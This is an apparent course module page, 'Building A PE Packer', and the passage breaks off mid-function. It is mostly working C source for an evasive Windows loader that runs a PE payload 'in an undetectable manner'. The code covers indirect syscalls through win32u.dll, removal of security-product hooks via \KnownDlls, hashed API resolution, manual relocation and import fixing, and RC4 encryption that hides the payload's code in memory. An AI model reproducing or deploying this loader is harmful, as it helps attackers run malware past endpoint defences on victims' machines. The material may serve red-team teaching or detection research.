          <div class="flex max-w-full min-w-full">
              <div class="flex-1 min-w-0">
                  
                  <div id="description-container" class="viewer code-description h-full w-full bg-gray-800/70 backdrop-blur-md backdrop-saturate-150 p-4 px-5 md:px-10 lg:px-20 border border-t-0 border-gray-600/60 shadow-inner">

    
    <div id="module-skeleton" role="status" aria-live="polite" class="absolute inset-0 z-20 overflow-hidden bg-slate-900/70 ring-1 ring-white/10">
    <div class="h-full w-full max-w-5xl mx-auto py-8 animate-pulse motion-reduce:animate-none flex flex-col">

        
        <div class="flex flex-col items-center gap-3">
        <div class="h-7 w-72 rounded-xl bg-white/15"></div>
        <div class="h-px w-full bg-white/10"></div>
        </div>

        
        <div class="h-6 w-40 rounded-lg bg-white/12"></div>

        
        <div class="space-y-3 mb-6">
        <div class="h-4 w-full rounded-lg bg-white/10"></div>
        <div class="h-4 w-11/12 rounded-lg bg-white/10"></div>
        <div class="h-4 w-10/12 rounded-lg bg-white/10"></div>
        <div class="h-4 w-9/12  rounded-lg bg-white/10"></div>
        </div>

        
        <div class="h-56 md:h-72 lg:h-80 rounded-xl bg-white/5 ring-1 ring-white/10 flex items-center justify-center">
        <svg viewBox="0 0 64 64" aria-hidden="true" class="w-12 h-12 text-white/30" fill="none" stroke="currentColor" stroke-width="2">
            <rect x="8" y="14" width="48" height="36" rx="3" class="opacity-30"></rect>
            <circle cx="26" cy="28" r="5"></circle>
            <path d="M16 46l12-14 8 10 8-8 12 12"></path>
        </svg>
        </div>

        
        <div class="mt-6 flex-1 relative rounded-xl overflow-hidden">
        <div class="absolute inset-0 rounded-xl" style="
            background:
                linear-gradient(to right, transparent 0, transparent 8px, rgba(255,255,255,0.00) 8px, rgba(255,255,255,0.00) calc(100% - 8px), transparent 100%),
                repeating-linear-gradient(
                to bottom,
                rgba(255,255,255,0.10),                 /* line color */
                rgba(255,255,255,0.10) 12px,            /* line thickness */
                rgba(255,255,255,0.00) 12px,            /* gap start */
                rgba(255,255,255,0.00) 22px             /* gap height */
                );
            ">
        </div>
        </div>

    </div>
    </div>


    
    

    
    <div id="module-content" class="opacity-0 transition-opacity duration-300">
        <h2>Building A PE Packer</h2>
<h3>Introduction</h3>
<p>Unlike the previous PE injection modules which were more like PoCs for learning purposes, this module will integrate <em>Local PE Injection</em> and <em>PeFluctuation</em>
 modules to create a PE packer capable of loading and executing a PE 
payload in an undetectable manner. Furthermore, this module will 
incorporate methods introduced in <em>Building An Evasive DLL Payload Loader</em>, so it is advisable to review that module for a comprehensive understanding.</p>
<h3>Loader's Capabilities</h3>
<p>The loader being built will have the following features:</p>
<ul>
<li>
<p>Indirect-Syscalls using an improved HellsHall implementation. This feature was introduced in the <em>Building An Evasive DLL Payload Loader</em> module.</p>
</li>
<li>
<p>DLL Unhooking via the <code>\KnownDlls\</code> directory without using the <code>RWX</code> memory permissions. This feature was introduced in the <em>Building An Evasive DLL Payload Loader</em> module.</p>
</li>
<li>
<p>Using the <a href="https://en.wikipedia.org/wiki/Lempel%E2%80%93Ziv%E2%80%93Welch">LZW</a> algorithm for PE payload compression.</p>
</li>
<li>
<p>Using PeFluctuation to hide the injected PE at runtime.</p>
</li>
<li>
<p>Obfuscated IAT using API hashing and IAT camouflage.</p>
</li>
<li>
<p>CRT library independent.</p>
</li>
</ul>
<h3>Using the Enhanced HellsHall</h3>
<p>In the <em>Building An Evasive DLL Payload Loader</em> module, HellsHall was enhanced to use the <code>syscall</code> instructions from the <code>win32u.dll</code> library instead of <code>ntdll.dll</code>
 to perform indirect syscalls. This allowed us to unhook DLLs without 
the need to use RWX memory permissions. The same HellsHall 
implementation will also be used in the current module. The functions 
below will be reused in this module:</p>
<ul>
<li>
<p><code>FetchNtSyscall</code> - Initializes an <code>NT_SYSCALL</code> structure of a given syscall. <code>FetchNtSyscall</code> executes <code>FetchWin32uSyscallInst</code> which retrieves a random <code>syscall</code> instruction address from within <code>win32u.dll</code>.</p>
</li>
<li>
<p><code>InitIndirectSyscalls</code> - Initializes an <code>NT_API</code> structure that will hold the required details to invoke all of the utilized syscalls in the loader. The <code>NT_API</code> structure is shown below.</p>
</li>
</ul>
<pre><code class="language-C">typedef struct _NT_API 
{
    NT_SYSCALL	NtOpenSection;
    NT_SYSCALL	NtMapViewOfSection;
    NT_SYSCALL	NtUnmapViewOfSection;
    NT_SYSCALL  NtAllocateVirtualMemory;
    NT_SYSCALL	NtProtectVirtualMemory;
    NT_SYSCALL	NtFlushInstructionCache;
    BOOL        bInit;

} NT_API, * PNT_API;
</code></pre>
<p>Further details on how the enhanced indirect syscall technique works are discussed in the <em>Building An Evasive DLL Payload Loader</em> module.</p>
<h3>Unhooking Without RWX permissions</h3>
<p>In the <em>Building An Evasive DLL Payload Loader</em> module, unhooking without <code>RWX</code> permissions was done by unhooking the first three DLLs using <code>RW</code> memory permissions and retrieving their unhooked versions from the <code>\KnownDlls\</code>
 directory. In this module, the same technique will be used, however, 
the implant will unhook all the loaded DLLs after resolving the PE 
payload's IAT. This is done because resolving the IAT loads additional 
DLLs to the local process, therefore waiting until these DLLs are loaded
 before starting the unhooking routine increases the likelihood of 
removing more installed userland hooks.</p>
<p>It is worth noting that although the unhooking routine of the current
 implant will attempt to unhook all loaded DLLs, it will avoid unhooking
 the <code>win32u.dll</code> module. This is because the <code>win32u.dll</code> module is used to execute the <code>syscall</code> instruction, which if unhooked, will cause an access violation since the implant is only using <code>RW</code> memory permissions.</p>
<p>Additionally, the unhooking process will have a Vectored Exception Handler (VEH) function <code>UnhookingVectoredExceptionHandler</code> which is invoked in case a DLL attempts to execute code in non-executable memory. <code>UnhookingVectoredExceptionHandler</code> will change the memory permissions from <code>RW</code> to <code>RWX</code> and overwrite the hooked <code>.text</code> section with the unhooked version that was retrieved from the <code>\KnownDlls\</code> directory.</p>
<h3>API Hashing</h3>
<p>As usual, WinAPIs will be invoked by API hashing which is demonstrated by the familiar <code>GetProcAddressH</code> and <code>GetModuleHandleH</code> functions shown below.</p>
<pre><code class="language-C">FARPROC GetProcAddressH(IN HMODULE 
hModule, IN UINT32 uApiHash) {

	PBYTE                             pBase                      = 
(PBYTE)hModule;
	PIMAGE_NT_HEADERS                 pImgNtHdrs                 = NULL;
	PIMAGE_EXPORT_DIRECTORY           pImgExportDir              = NULL;
	PDWORD                            pdwFunctionNameArray       = NULL;
	PDWORD                            pdwFunctionAddressArray    = NULL;
	PWORD                             pwFunctionOrdinalArray     = NULL;
	DWORD                             dwImgExportDirSize         = 0x00;

	if (!hModule || !uApiHash) {
		return NULL;
	}

	pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + 
((PIMAGE_DOS_HEADER)pBase)-&gt;e_lfanew);
	if (pImgNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	pImgExportDir			    = (PIMAGE_EXPORT_DIRECTORY)(pBase + 
pImgNtHdrs-
&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	dwImgExportDirSize		    = 
pImgNtHdrs-
&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
	pdwFunctionNameArray		    = (PDWORD)(pBase + 
pImgExportDir-&gt;AddressOfNames);
	pdwFunctionAddressArray		= (PDWORD)(pBase + 
pImgExportDir-&gt;AddressOfFunctions);
	pwFunctionOrdinalArray		= (PWORD)(pBase + 
pImgExportDir-&gt;AddressOfNameOrdinals);


	for (DWORD i = 0; i &lt; pImgExportDir-&gt;NumberOfFunctions; i++) {

		CHAR*	pFunctionName		= (CHAR*)(pBase + pdwFunctionNameArray[i]);
		PVOID	pFunctionAddress	= (PVOID)(pBase + 
pdwFunctionAddressArray[pwFunctionOrdinalArray[i]]);

		if (HASH(pFunctionName) == uApiHash) {

			// Forwarded functions support:
			if ((((ULONG_PTR)pFunctionAddress) &gt;= ((ULONG_PTR)pImgExportDir)) 
&amp;&amp;
				(((ULONG_PTR)pFunctionAddress) &lt; ((ULONG_PTR)pImgExportDir) + 
dwImgExportDirSize)
				) {

				CHAR		cForwarderName[MAX_PATH]        = { 0 };
				DWORD		dwDotOffset                     = 0x00;
				PCHAR		pcFunctionMod                   = NULL;
				PCHAR		pcFunctionName                  = NULL;

				memcpy(cForwarderName, pFunctionAddress, 
strlen((PCHAR)pFunctionAddress));

				for (int i = 0; i &lt; strlen((PCHAR)cForwarderName); i++) {

					if (((PCHAR)cForwarderName)[i] == '.') {
						dwDotOffset = i;
						cForwarderName[i] = NULL;
						break;
					}
				}

				pcFunctionMod = cForwarderName;
				pcFunctionName = cForwarderName + dwDotOffset + 1;
				// "g_WinAPI.pLoadLibraryA" is LoadLibraryA's function pointer 
(resolved by API Hashing)
				return GetProcAddressH(g_WinAPI.pLoadLibraryA(pcFunctionMod), 
HASH(pcFunctionName));
			}
			return (FARPROC)pFunctionAddress;
		}

	}

	return NULL;
}


HMODULE GetModuleHandleH(IN UINT32 uModuleHash) {

	PPEB                    pPeb            = NULL;
	PPEB_LDR_DATA           pLdr            = NULL;
	PLDR_DATA_TABLE_ENTRY   pDte            = NULL;

	pPeb = (PPEB)__readgsqword(0x60);
	pLdr = (PPEB_LDR_DATA)(pPeb-&gt;LoaderData);
	pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr-&gt;InMemoryOrderModuleList.Flink);

	// Return the handle of the local .exe image
	if (!uModuleHash)
		return (HMODULE)(pDte-&gt;InInitializationOrderLinks.Flink);

	while (pDte) {

		if (pDte-&gt;FullDllName.Buffer &amp;&amp; pDte-&gt;FullDllName.Length
 &lt; MAX_PATH) {

			CHAR	cLDllName[MAX_PATH]    = { 0 };
			DWORD	x                      = 0x00;

			while (pDte-&gt;FullDllName.Buffer[x]) {

				CHAR	wC = pDte-&gt;FullDllName.Buffer[x];

				// Convert to lowercase
				if (wC &gt;= 'A' &amp;&amp; wC &lt;= 'Z')
					cLDllName[x] = wC - 'A' + 'a';
				// Copy other characters (numbers, special characters ...)
				else
					cLDllName[x] = wC;

				x++;
			}

			cLDllName[x] = '\0';

			if (HASH(pDte-&gt;FullDllName.Buffer) == uModuleHash || 
HASH(cLDllName) == uModuleHash)
				return (HMODULE)(pDte-&gt;InInitializationOrderLinks.Flink);
		}

		// Move to the next node in the linked list
		pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
	}


	return NULL;
}
</code></pre>
<h4>CRC String Hashing</h4>
<p>Both of the aforementioned functions make use of the <em>Cyclic Redundancy Check</em> string hashing algorithm, represented in the following function.</p>
<pre><code class="language-C">UINT32 CRC32B(LPCSTR cString)
{

    UINT32      uMask 	= 0x00,
                uHash 	= 0xFFFFEFFF;
    INT         i 	    = 0x00;

    while (cString[i] != 0) {

        uHash = uHash ^ (UINT32)cString[i];

        for (int ii = 0; ii &lt; 8; ii++) {

            uMask = -1 * (uHash &amp; 1);
            uHash = (uHash &gt;&gt; 1) ^ (CRC_POLYNOMIAL &amp; uMask);
        }

        i++;
    }

    return ~uHash;
}
</code></pre>
<h3>WINAPIs Structure</h3>
<p>Furthermore, a structure named <code>WINAPIs</code> will be defined, holding the function pointers of all utilized WinAPIs across the whole implementation. The <code>WINAPIs</code> structure is shown below.</p>
<pre><code class="language-C">typedef struct _WINAPIs 
{
	fnCreateTimerQueueTimer                 pCreateTimerQueueTimer;
	fnCreateTimerQueue                      pCreateTimerQueue;
	fnAddVectoredExceptionHandler           pAddVectoredExceptionHandler;
	fnRemoveVectoredExceptionHandler        pRemoveVectoredExceptionHandler;

	fnRtlAddFunctionTable                   pRtlAddFunctionTable;
	fnSystemFunction032                     pSystemFunction032;
	fnLoadLibraryA                          pLoadLibraryA;
	fnInitializeCriticalSection             pInitializeCriticalSection;
	fnEnterCriticalSection                  pEnterCriticalSection;
	fnLeaveCriticalSection                  pLeaveCriticalSection;

} WINAPIs, *PWINAPIs;
</code></pre>
<br>
<h3>InitializeWinAPIs Function</h3>
<p>Initializing the <code>WINAPIs</code> structure is done via the <code>InitializeWinAPIs</code> function, which invokes both <code>GetProcAddressH</code> and <code>GetModuleHandleH</code> to resolve the function pointers and assign them to the structure. <code>InitializeWinAPIs</code> accepts one parameter, which represents the <code>WINAPIs</code> structure pointer that is to be populated.</p>
<pre><code class="language-C">BOOL InitializeWinAPIs(OUT PWINAPIs 
pWinAPIs) 
{
    // LoadLibraryA should always be the first API to resolve (it's used
 in GetProcAddressH in case of a forwarded function)
    if (!(pWinAPIs-&gt;pLoadLibraryA = 
GetProcAddressH(GetModuleHandleH(kernel32dll_CRC32), 
LoadLibraryA_CRC32))) {
        return FALSE;
    }

    if (!(pWinAPIs-&gt;pAddVectoredExceptionHandler = 
GetProcAddressH(GetModuleHandleH(kernel32dll_CRC32), 
AddVectoredExceptionHandler_CRC32))) {
        return FALSE;
    }

    if (!(pWinAPIs-&gt;pRemoveVectoredExceptionHandler = 
GetProcAddressH(GetModuleHandleH(kernel32dll_CRC32), 
RemoveVectoredExceptionHandler_CRC32))) {
        return FALSE;
    }

    if (!(pWinAPIs-&gt;pCreateTimerQueue = 
GetProcAddressH(GetModuleHandleH(kernel32dll_CRC32), 
CreateTimerQueue_CRC32))) {
        return FALSE;
    }

    if (!(pWinAPIs-&gt;pCreateTimerQueueTimer = 
GetProcAddressH(GetModuleHandleH(kernel32dll_CRC32), 
CreateTimerQueueTimer_CRC32))) {
        return FALSE;
    }

    if (!(pWinAPIs-&gt;pRtlAddFunctionTable = 
GetProcAddressH(GetModuleHandleH(kernel32dll_CRC32), 
RtlAddFunctionTable_CRC32))) {
        return FALSE;
    }

    if (!(pWinAPIs-&gt;pInitializeCriticalSection = 
GetProcAddressH(GetModuleHandleH(kernel32dll_CRC32), 
InitializeCriticalSection_CRC32))) {
        return FALSE;
    }

    if (!(pWinAPIs-&gt;pEnterCriticalSection = 
GetProcAddressH(GetModuleHandleH(kernel32dll_CRC32), 
EnterCriticalSection_CRC32))) {
        return FALSE;
    }

    if (!(pWinAPIs-&gt;pLeaveCriticalSection = 
GetProcAddressH(GetModuleHandleH(kernel32dll_CRC32), 
LeaveCriticalSection_CRC32))) {
        return FALSE;
    }

    if (!(pWinAPIs-&gt;pSystemFunction032 = 
GetProcAddressH(GetModuleHandleH(advapi32dll_CRC32), 
SystemFunction032_CRC32))) {
        return FALSE;
    }

    return TRUE;
}
</code></pre>
<br>
<h3>HashCalculator Program</h3>
<p>All the used hashes are calculated using the <code>HashCalculator</code> program which prints them to the console as per the image below.</p>
<img width="800px" style="margin:auto" alt="image" src="31_files/pepacker-175709862-9c4080c5-52dd-45d8-a815-8b8c3ca10bde.png">
<p>Note that <code>HashCalculator</code> does not only print WinAPIs 
hashes but also syscalls hashes and other hash values related to other 
tasks introduced later in the module.</p>
<h3>Reusing LocalPeExec Functions</h3>
<p>As shown in earlier modules, the most crucial steps for PE injections
 are relocation, IAT fixing, and setting suitable memory permissions for
 each PE section. These steps were implemented several times in previous
 modules using the <code>FixReloc</code>, <code>FixImportAddressTable</code>, and <code>FixMemPermissions</code>
 functions respectively. These functions will also be used in this 
implementation, utilizing API hashing and using HellsHall when required.</p>
<p><code>FixReloc</code>, <code>FixImportAddressTable</code>, and <code>FixMemPermissions</code> are shown below.</p>
<pre><code class="language-C">BOOL FixReloc(IN PIMAGE_DATA_DIRECTORY 
pEntryBaseRelocDataDir, IN ULONG_PTR pPeBaseAddress, IN ULONG_PTR 
pPreferableAddress) {

	// Pointer to the beginning of the base relocation block.
	PIMAGE_BASE_RELOCATION pImgBaseRelocation = (pPeBaseAddress + 
pEntryBaseRelocDataDir-&gt;VirtualAddress);

	// The difference between the current PE image base address and its 
preferable base address.
	ULONG_PTR uDeltaOffset = pPeBaseAddress - pPreferableAddress;

	// Pointer to individual base relocation entries.
	PBASE_RELOCATION_ENTRY pBaseRelocEntry = NULL;

	// Iterate through all the base relocation blocks.
	while (pImgBaseRelocation-&gt;VirtualAddress) {

		// Pointer to the first relocation entry in the current block.
		pBaseRelocEntry = (PBASE_RELOCATION_ENTRY)(pImgBaseRelocation + 1);

		// Iterate through all the relocation entries in the current block.
		while ((PBYTE)pBaseRelocEntry != (PBYTE)pImgBaseRelocation + 
pImgBaseRelocation-&gt;SizeOfBlock) {
			// Process the relocation entry based on its type.
			switch (pBaseRelocEntry-&gt;Type) {

				case IMAGE_REL_BASED_DIR64: {
					// Adjust a 64-bit field by the delta offset.
					*((ULONG_PTR*)(pPeBaseAddress + 
pImgBaseRelocation-&gt;VirtualAddress + pBaseRelocEntry-&gt;Offset)) += 
uDeltaOffset;
					break;
				}
				case IMAGE_REL_BASED_HIGHLOW: {
					// Adjust a 32-bit field by the delta offset.
					*((DWORD*)(pPeBaseAddress + pImgBaseRelocation-&gt;VirtualAddress +
 pBaseRelocEntry-&gt;Offset)) += (DWORD)uDeltaOffset;
					break;
				}
				case IMAGE_REL_BASED_HIGH: {
					// Adjust the high 16 bits of a 32-bit field.
					*((WORD*)(pPeBaseAddress + pImgBaseRelocation-&gt;VirtualAddress + 
pBaseRelocEntry-&gt;Offset)) += HIWORD(uDeltaOffset);
					break;
				}
				case IMAGE_REL_BASED_LOW: {
					// Adjust the low 16 bits of a 32-bit field.
					*((WORD*)(pPeBaseAddress + pImgBaseRelocation-&gt;VirtualAddress + 
pBaseRelocEntry-&gt;Offset)) += LOWORD(uDeltaOffset);
					break;
				}
				case IMAGE_REL_BASED_ABSOLUTE: {
					// No relocation is required.
					break;
				}
				default: {
					return FALSE;
				}
			
			}

			pBaseRelocEntry++;
		}

		pImgBaseRelocation = (PIMAGE_BASE_RELOCATION)pBaseRelocEntry;
	}

	return TRUE;
}


BOOL FixImportAddressTable(IN PIMAGE_DATA_DIRECTORY pEntryImportDataDir,
 IN PBYTE pPeBaseAddress) {

	// Pointer to an import descriptor for a DLL
	PIMAGE_IMPORT_DESCRIPTOR	pImgDescriptor = NULL;
	// Iterate over the import descriptors
	for (SIZE_T i = 0; i &lt; pEntryImportDataDir-&gt;Size; i += 
sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
		// Get the current import descriptor
		pImgDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(pPeBaseAddress + 
pEntryImportDataDir-&gt;VirtualAddress + i);
		// If both thunks are NULL, we've reached the end of the import 
descriptors list
		if (pImgDescriptor-&gt;OriginalFirstThunk == NULL &amp;&amp; 
pImgDescriptor-&gt;FirstThunk == NULL)
			break;

		// Retrieve information from the current import descriptor
		LPSTR		cDllName                 = (LPSTR)(pPeBaseAddress + 
pImgDescriptor-&gt;Name);
		ULONG_PTR	uOriginalFirstThunkRVA   = 
pImgDescriptor-&gt;OriginalFirstThunk;
		ULONG_PTR	uFirstThunkRVA           = pImgDescriptor-&gt;FirstThunk;
		SIZE_T		ImgThunkSize             = 0x00;					// Used to move to the 
next function (iterating through the IAT and INT)
		HMODULE		hModule                  = NULL;


		if (!(hModule = g_WinAPI.pLoadLibraryA(cDllName)))
			return FALSE;

		// Iterate over the imported functions for the current DLL
		while (TRUE) {

			// Get pointers to the first thunk and original first thunk data
			PIMAGE_THUNK_DATA               pOriginalFirstThunk     = 
(PIMAGE_THUNK_DATA)(pPeBaseAddress + uOriginalFirstThunkRVA + 
ImgThunkSize);
			PIMAGE_THUNK_DATA               pFirstThunk             = 
(PIMAGE_THUNK_DATA)(pPeBaseAddress + uFirstThunkRVA + ImgThunkSize);
			PIMAGE_IMPORT_BY_NAME           pImgImportByName        = NULL;
			ULONG_PTR                       pFuncAddress            = NULL;

			// At this point both 'pOriginalFirstThunk' &amp; 'pFirstThunk' will 
have the same values
			// However, to populate the IAT (pFirstThunk), one should use the INT
 (pOriginalFirstThunk) to retrieve the 
			// functions addresses and patch the IAT 
(pFirstThunk-&gt;u1.Function) with the calculated address.
			if (pOriginalFirstThunk-&gt;u1.Function == NULL &amp;&amp; 
pFirstThunk-&gt;u1.Function == NULL) {
				break;
			}


			// If the ordinal flag is set, import the function by its ordinal 
number
			if (IMAGE_SNAP_BY_ORDINAL(pOriginalFirstThunk-&gt;u1.Ordinal)) {
				// Since our GetProcAddressH function doesn't support ordinals as 
input, one can fetch the function address via the following code:

				// Retrieve required headers of the loaded DLL module
				PIMAGE_NT_HEADERS               _pImgNtHdrs                 = NULL;
				PIMAGE_EXPORT_DIRECTORY         _pImgExportDir              = NULL;
				PDWORD                          _pdwFunctionAddressArray    = NULL;

				_pImgNtHdrs = ((ULONG_PTR)hModule + 
((PIMAGE_DOS_HEADER)hModule)-&gt;e_lfanew);
				if (_pImgNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)
					return FALSE;

				_pImgExportDir			= (PIMAGE_EXPORT_DIRECTORY)(((ULONG_PTR)hModule) + 
_pImgNtHdrs-
&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

				_pdwFunctionAddressArray	= (PDWORD)((ULONG_PTR)hModule + 
_pImgExportDir-&gt;AddressOfFunctions);
				// Use the ordinal to retrieve the function address
				pFuncAddress			= ((ULONG_PTR)hModule + 
_pdwFunctionAddressArray[pOriginalFirstThunk-&gt;u1.Ordinal]);

				if (!pFuncAddress) {
					return FALSE;
				}

			}
			// Import function by name
			else {
				pImgImportByName = (PIMAGE_IMPORT_BY_NAME)((SIZE_T)pPeBaseAddress + 
pOriginalFirstThunk-&gt;u1.AddressOfData);
				if (!(pFuncAddress = (ULONG_PTR)GetProcAddressH(hModule, 
HASH(pImgImportByName-&gt;Name)))) {
					return FALSE;
				}
			}

			// Install the function address in the IAT
			pFirstThunk-&gt;u1.Function = (ULONGLONG)pFuncAddress;

			// Move to the next function in the IAT/INT array
			ImgThunkSize += sizeof(IMAGE_THUNK_DATA);

		}
	}

	return TRUE;
}

/* Global Variables */
ULONG_PTR			g_uPeTextAddress		= NULL;
SIZE_T				g_sPeTextSize			= NULL;


BOOL FixMemPermissions(IN ULONG_PTR pPeBaseAddress, IN PIMAGE_NT_HEADERS
 pImgNtHdrs, IN PIMAGE_SECTION_HEADER pImgSecHdr) {

	// Loop through each section of the PE image.
	for (DWORD i = 0; i &lt; pImgNtHdrs-&gt;FileHeader.NumberOfSections; 
i++) {

		NTSTATUS	STATUS			= 0x00;
		DWORD		dwProtection	= 0x00,
				    dwOldProtection	= 0x00;
		PVOID		pAddress		= (PVOID)(pPeBaseAddress + 
pImgSecHdr[i].VirtualAddress);
		SIZE_T		sSize			= (SIZE_T)pImgSecHdr[i].SizeOfRawData;

		// Skip the section if it has no data or no associated virtual 
address.
		if (!pImgSecHdr[i].SizeOfRawData || !pImgSecHdr[i].VirtualAddress)
			continue;

		if (pImgSecHdr[i].Characteristics &amp; IMAGE_SCN_MEM_WRITE)
			dwProtection = PAGE_WRITECOPY;

		if (pImgSecHdr[i].Characteristics &amp; IMAGE_SCN_MEM_READ)
			dwProtection = PAGE_READONLY;

		if ((pImgSecHdr[i].Characteristics &amp; IMAGE_SCN_MEM_WRITE) 
&amp;&amp; (pImgSecHdr[i].Characteristics &amp; IMAGE_SCN_MEM_READ))
			dwProtection = PAGE_READWRITE;

		if (pImgSecHdr[i].Characteristics &amp; IMAGE_SCN_MEM_EXECUTE)
			dwProtection = PAGE_EXECUTE;

		if ((pImgSecHdr[i].Characteristics &amp; IMAGE_SCN_MEM_EXECUTE) 
&amp;&amp; (pImgSecHdr[i].Characteristics &amp; IMAGE_SCN_MEM_WRITE))
			dwProtection = PAGE_EXECUTE_WRITECOPY;

		// If memory should be RX, we save its base address and size
		if ((pImgSecHdr[i].Characteristics &amp; IMAGE_SCN_MEM_EXECUTE) 
&amp;&amp; (pImgSecHdr[i].Characteristics &amp; IMAGE_SCN_MEM_READ)) {
			// Save RX base address
			if (!g_uPeTextAddress)
				g_uPeTextAddress = pPeBaseAddress + pImgSecHdr[i].VirtualAddress;

			// Save the RX memory size
			if (!g_sPeTextSize)
				g_sPeTextSize = pImgSecHdr[i].SizeOfRawData;

			dwProtection = PAGE_EXECUTE_READ;
		}

		if ((pImgSecHdr[i].Characteristics &amp; IMAGE_SCN_MEM_EXECUTE) 
&amp;&amp; (pImgSecHdr[i].Characteristics &amp; IMAGE_SCN_MEM_WRITE) 
&amp;&amp; (pImgSecHdr[i].Characteristics &amp; IMAGE_SCN_MEM_READ))
			dwProtection = PAGE_EXECUTE_READWRITE;

		// Apply the determined memory protection to the section.
		SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
		if (!NT_SUCCESS(STATUS = RunSyscall(NtCurrentProcess(), &amp;pAddress,
 &amp;sSize, dwProtection, &amp;dwOldProtection))) {
			return FALSE;
		}
	}

	return TRUE;
}
</code></pre>
<p>Since this implementation requires PeFluctuation, the <code>FixMemPermissions</code> function must keep track of the <code>PAGE_EXECUTE_READ</code> memory region, which is the <code>.text</code> section of the PE payload. This is done by initializing the <code>g_uPeTextAddress</code> and <code>g_sPeTextSize</code> global variables which are the executable memory's base address and size respectively. The <code>FixMemPermissions</code> function was updated to perform this action in the <em>PeFluctuation</em> module, review that module if necessary.</p>
<h3>PEFluctuation Implementation</h3>
<p>As shown in the previous module, PeFluctuation's purpose is to hide 
the PE payload at runtime. A brief overview of the implementation steps 
is shown below, however, if you need a complete overview of the steps 
revisit the previous module.</p>
<ul>
<li>
<p>After <code>CreateTimerQueueTimer</code>'s timer expires, it executes <code>Rc4EncryptDecrypt</code>;
 a function that will encrypt the executable memory region of the PE 
payload, and mark it as read-only. This step occurs prior to executing 
the payload's entry point.</p>
</li>
<li>
<p>Upon code execution attempts made by the payload, an <code>EXCEPTION_ACCESS_VIOLATION</code> exception will be raised, which is handled by a VEH function named <code>PeFluctuationVectoredExceptionHandler</code>. This function will decrypt the encrypted .text section and mark it as executable memory, allowing the payload to run its code.</p>
</li>
<li>
<p>From within <code>PeFluctuationVectoredExceptionHandler</code>, the <code>Rc4EncryptDecrypt</code> function will be called again using <code>CreateTimerQueueTimer</code> to re-conceal the PE payload in memory.</p>
</li>
</ul>
<h4>Rc4EncryptDecrypt</h4>
<p>The <code>Rc4EncryptDecrypt</code> function accepts the following parameters:</p>
<ul>
<li>
<p><code>pBuffer</code> - Base address of the memory to encrypt/decrypt.</p>
</li>
<li>
<p><code>dwBufferLen</code> - Size of the memory region to encrypt/decrypt starting from <code>pBuffer</code>.</p>
</li>
<li>
<p><code>bDecrypt</code> - If this parameter is <code>TRUE</code>, it sets the memory permission to <code>PAGE_EXECUTE_READ</code> after decrypting. Whereas if it's <code>FALSE</code>, it sets the memory permission to <code>PAGE_READONLY</code> after encrypting.</p>
</li>
</ul>
<pre><code class="language-C">#define		RC4_KEY_SIZE				0x10	// 16 byte


BYTE	g_Rc4Key[RC4_KEY_SIZE]	= { 0xFF, 0xDD, 0x79, 0x7F, 0x03, 0xA5, 
0x87, 0xEF, 0x71, 0x4D, 0xDB, 0x7D, 0xF4, 0x47, 0x77, 0x01 };

BOOL Rc4EncryptDecrypt(IN PBYTE pBuffer, IN DWORD dwBufferLen, IN BOOL 
bDecrypt) {

	NTSTATUS				STATUS					= NULL;
	USTRING					uStrBuffer				= { .Buffer = pBuffer,  .Length = 
dwBufferLen,  .MaximumLength = dwBufferLen };
	USTRING					uStrKey					= { .Buffer = g_Rc4Key, .Length = RC4_KEY_SIZE,
 .MaximumLength = RC4_KEY_SIZE };
	DWORD					dwOldProtection			= 0x00;
	PVOID					pTmpBuffer				= (PVOID)pBuffer;
	SIZE_T					sTmpBufferLen			= (SIZE_T)dwBufferLen;

	if (!pTmpBuffer || !sTmpBufferLen)
		return FALSE;

	// Change the target's memory permissions to RW to allow encrypting (it
 was RO)
	SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
	if (!NT_SUCCESS(STATUS = RunSyscall(NtCurrentProcess(), 
&amp;pTmpBuffer, &amp;sTmpBufferLen, PAGE_READWRITE, 
&amp;dwOldProtection))) {
		return FALSE;
	}
	
	// Encrypt/Decrypt input data
	if (!NT_SUCCESS((STATUS = g_WinAPI.pSystemFunction032(&amp;uStrBuffer, 
&amp;uStrKey))) != 0x0) {
		return FALSE;
	}

	
	// Change the memory permissions to RO/RX.
	SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
	if (!NT_SUCCESS(STATUS = RunSyscall(NtCurrentProcess(), 
&amp;pTmpBuffer, &amp;sTmpBufferLen, (bDecrypt == TRUE ? 
PAGE_EXECUTE_READ : PAGE_READONLY), &amp;dwOldProtection))) {
		return FALSE;
	}
	
	return TRUE;
}
</code></pre>
<h4>PeFluctuationVectoredExceptionHandler</h4>
<p>Our VEH function that will handle exceptions is shown below.</p>
<pre><code class="language-C">LONG WINAPI 
PeFluctuationVectoredExceptionHandler(PEXCEPTION_POINTERS 
pExceptionInfo) 
{
	// Check the exception code
	if (pExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == 
EXCEPTION_ACCESS_VIOLATION) {

		// Check the exception address. If the exception address is coming 
from inside of the RX (.text) memory, it's handled
		if (pExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionAddress &gt;= 
g_uPeTextAddress &amp;&amp; 
pExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionAddress &lt;= 
(g_uPeTextAddress + g_sPeTextSize)) {

			NTSTATUS	STATUS			    = 0x00;
			DWORD		dwOldProtection		= 0x00;
			PVOID		pTmpPeTextAddress	= (PVOID)g_uPeTextAddress;
			SIZE_T		sTmpPeTextSize		= (SIZE_T)g_sPeTextSize;


			if (!g_hTimerQueue || !g_hTimer)
				goto _FAILURE;

			// Decrypt the PE's encrypted data - and allow execution
			if (!Rc4EncryptDecrypt(g_uPeTextAddress, g_sPeTextSize, TRUE))
				goto _FAILURE;
			
			// Execute the 'ObfuscationTimerCallback' callback function after 
'EXEC_WAIT' seconds to re-encrypt 
